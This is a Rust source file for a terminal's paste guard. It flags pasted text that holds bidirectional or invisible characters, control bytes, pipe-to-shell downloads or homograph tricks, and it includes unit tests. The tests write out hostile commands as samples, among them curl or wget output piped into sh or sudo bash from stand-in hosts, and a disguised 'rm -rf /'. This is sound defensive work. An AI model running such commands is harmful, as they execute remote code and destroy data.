//! Content heuristics for the careful-paste guard: beyond the
//! multi-line check, a paste can be dangerous on its CONTENT, the
//! classes MobaXterm's malicious-paste detection covers. Detection is
//! pure and re-run at render time (the parked text is the only
//! state); each hit adds one warning line to the confirmation dialog.

/// One suspicious trait found in a pending paste. Ordered by how
/// alarming the dialog should read.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum PasteWarning {
    /// Invisible / bidirectional control characters (RLO attacks,
    /// zero-width joiners hiding content, BOMs mid-text).
    BidiOrInvisible,
    /// Raw terminal control bytes other than newline/tab (an embedded
    /// ESC can inject sequences straight into the shell).
    ControlSequences,
    /// `curl ... | sh` style pipe-to-shell (including `bash <(curl`
    /// and `sh -c "$(wget ...)"` forms).
    PipeToShell,
    /// A word mixing Latin with Cyrillic/Greek letters, the classic
    /// homograph trick (`sudо` with a Cyrillic `о`).
    Homograph,
}

impl PasteWarning {
    /// i18n key of the dialog's warning line.
    pub(crate) fn label_key(self) -> &'static str {
        match self {
            PasteWarning::BidiOrInvisible => "paste_guard_bidi",
            PasteWarning::ControlSequences => "paste_guard_control",
            PasteWarning::PipeToShell => "paste_guard_pipe",
            PasteWarning::Homograph => "paste_guard_homograph",
        }
    }
}

/// Invisible / direction-override code points worth flagging. Kept
/// explicit (not "any non-ASCII") so ordinary accented text and CJK
/// never trip the guard.
fn is_invisible_or_bidi(c: char) -> bool {
    matches!(
        c,
        '\u{202A}'..='\u{202E}' // LRE/RLE/PDF/LRO/RLO
        | '\u{2066}'..='\u{2069}' // LRI/RLI/FSI/PDI
        | '\u{200B}'..='\u{200F}' // ZWSP/ZWNJ/ZWJ/LRM/RLM
        | '\u{2028}' | '\u{2029}' // line/paragraph separator
        | '\u{00AD}' // soft hyphen
        | '\u{FEFF}' // BOM / ZWNBSP
    )
}

/// Whether a paste waits for the confirmation dialog: a line break under
/// careful paste, a warning under the paste guard (each its own setting).
/// The one rule for a paste made by hand and a snippet's paste step.
pub(crate) fn needs_confirmation(text: &str, careful_paste: bool, paste_guard: bool) -> bool {
    (careful_paste && (text.contains('\n') || text.contains('\r')))
        || (paste_guard && !paste_warnings(text).is_empty())
}

/// Scan `text` for every suspicious-content class, deduplicated, in
/// display order.
pub(crate) fn paste_warnings(text: &str) -> Vec<PasteWarning> {
    let mut out = Vec::new();

    if text.chars().any(is_invisible_or_bidi) {
        out.push(PasteWarning::BidiOrInvisible);
    }

    // C0 controls other than \n, \r, \t, plus the C1 range. An ESC in
    // a paste means terminal sequences execute on insert.
    if text
        .chars()
        .any(|c| (c.is_control() && !matches!(c, '\n' | '\r' | '\t')) || ('\u{80}'..='\u{9F}').contains(&c))
    {
        out.push(PasteWarning::ControlSequences);
    }

    // Scan for fetch-and-execute AFTER stripping the invisible
    // characters: hiding a ZWSP inside "curl" is precisely how an
    // attacker would defeat this detector, so the two checks compose.
    let cleaned: String = text.chars().filter(|c| !is_invisible_or_bidi(*c)).collect();
    if has_pipe_to_shell(&cleaned) {
        out.push(PasteWarning::PipeToShell);
    }

    // Homograph: any whitespace-delimited token mixing Latin letters
    // with Cyrillic or Greek ones. Pure single-script non-Latin text
    // (a Russian commit message) passes untouched.
    let mixed_token = text.split_whitespace().any(|tok| {
        let has_latin = tok.chars().any(|c| c.is_ascii_alphabetic());
        let has_confusable = tok.chars().any(|c| {
            ('\u{0400}'..='\u{04FF}').contains(&c) // Cyrillic
                || ('\u{0370}'..='\u{03FF}').contains(&c) // Greek
        });
        has_latin && has_confusable
    });
    if mixed_token {
        out.push(PasteWarning::Homograph);
    }

    out
}

/// Detect fetch-and-execute one-liners: a downloader piped into a
/// shell, or command-substituted into one. Case-insensitive; requires
/// BOTH halves so `curl -O file` and `grep foo | sh.log` don't trip.
fn has_pipe_to_shell(text: &str) -> bool {
    let lower = text.to_lowercase();
    let has_fetcher = lower.contains("curl") || lower.contains("wget");
    if !has_fetcher {
        return false;
    }
    // `... | sh` / `| sudo bash` forms: a pipe followed (optionally by
    // sudo/env words) by a bare shell name.
    let piped = lower.split('|').skip(1).any(|seg| {
        let mut words = seg.split_whitespace();
        let mut w = words.next();
        while matches!(w, Some("sudo") | Some("env") | Some("-e")) {
            w = words.next();
        }
        matches!(w, Some("sh" | "bash" | "zsh" | "dash" | "ksh"))
    });
    // `bash <(curl ...)` / `sh -c "$(wget ...)"` substitution forms.
    let substituted = ["<(curl", "<(wget", "$(curl", "$(wget"]
        .iter()
        .any(|p| lower.contains(p));
    piped || substituted
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn each_setting_gates_its_own_trait() {
        let lines = "ls\nrm -rf build";
        let piped = "curl https://x.example/i.sh | sh";
        assert!(needs_confirmation(lines, true, false));
        assert!(!needs_confirmation(lines, false, true));
        assert!(needs_confirmation(piped, false, true));
        assert!(!needs_confirmation(piped, true, false));
        assert!(!needs_confirmation("uptime", true, true));
    }

    #[test]
    fn clean_text_raises_nothing() {
        assert!(paste_warnings("ls -la /var/log\ncat foo.txt").is_empty());
        // Ordinary accented / non-Latin text is not a homograph.
        assert!(paste_warnings("echo coração").is_empty());
        assert!(paste_warnings("эхо привет").is_empty());
        // A downloader without a shell sink is fine.
        assert!(paste_warnings("curl -O https://example.com/x.tar.gz").is_empty());
        // A pipe into something that merely starts with sh is fine.
        assert!(paste_warnings("curl x | shuf").is_empty());
    }

    #[test]
    fn each_class_is_detected() {
        assert_eq!(
            paste_warnings("echo \u{202E}gpj.exe"),
            vec![PasteWarning::BidiOrInvisible]
        );
        assert_eq!(
            paste_warnings("innocent\u{1b}[2J"),
            vec![PasteWarning::ControlSequences]
        );
        assert_eq!(
            paste_warnings("curl -fsSL https://x.sh | sudo bash"),
            vec![PasteWarning::PipeToShell]
        );
        assert_eq!(
            paste_warnings("bash <(wget -qO- https://x.sh)"),
            vec![PasteWarning::PipeToShell]
        );
        // Cyrillic о inside a Latin word.
        assert_eq!(
            paste_warnings("sud\u{043E} rm -rf /"),
            vec![PasteWarning::Homograph]
        );
    }

    #[test]
    fn multiple_classes_stack() {
        let w = paste_warnings("cu\u{200B}rl https://x | sh");
        assert!(w.contains(&PasteWarning::BidiOrInvisible));
        assert!(w.contains(&PasteWarning::PipeToShell));
    }
}
